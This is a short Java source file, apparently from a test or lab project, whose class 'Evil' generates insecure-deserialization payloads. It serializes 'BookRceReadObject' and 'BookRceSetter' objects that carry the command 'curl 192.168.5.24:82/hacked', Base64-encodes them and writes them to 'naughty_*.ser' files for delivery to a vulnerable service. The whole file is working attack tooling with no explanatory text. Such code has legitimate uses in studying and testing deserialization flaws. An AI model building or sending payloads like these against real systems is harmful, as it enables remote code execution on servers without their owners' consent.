package com.example.my.tests;

import java.io.*;
import java.util.Base64;

public class Evil {
    public static void main(String[] args) {
		try {
			createBookRceReadObjectPayload();
			createBookRceSetterPayload();
		} catch (Exception e) {
            System.out.println(e.toString());
        }
    }

	public static void createBookRceReadObjectPayload() throws IOException {
		BookRceReadObject myBook = new BookRceReadObject("someTitle", "blub", "curl 192.168.5.24:82/hacked");
		String myBookSerialized = serializeBook(myBook);

		FileWriter fileWriter = new FileWriter("naughty_BookRceReadObject.ser");
		PrintWriter printWriter = new PrintWriter(fileWriter);
		printWriter.print(myBookSerialized);
		printWriter.close();
	}

	public static void createBookRceSetterPayload() throws IOException {
		BookRceSetter myBook = new BookRceSetter("someTitle", "blub", "curl 192.168.5.24:82/hacked");
		String myBookSerialized = serializeBook(myBook);

		FileWriter fileWriter = new FileWriter("naughty_BookRceSetter.ser");
		PrintWriter printWriter = new PrintWriter(fileWriter);
		printWriter.print(myBookSerialized);
		printWriter.close();
	}

    public static String serializeBook(Object myBook) {
		ByteArrayOutputStream baos = null;

		try {
			baos = new ByteArrayOutputStream();
			ObjectOutputStream oos = new ObjectOutputStream(baos);
			oos.writeObject(myBook);
			oos.close();
		}
		catch(Exception e)
		{
			System.out.println(e);
		}

		return Base64.getEncoder().encodeToString(baos.toByteArray());
	}
}
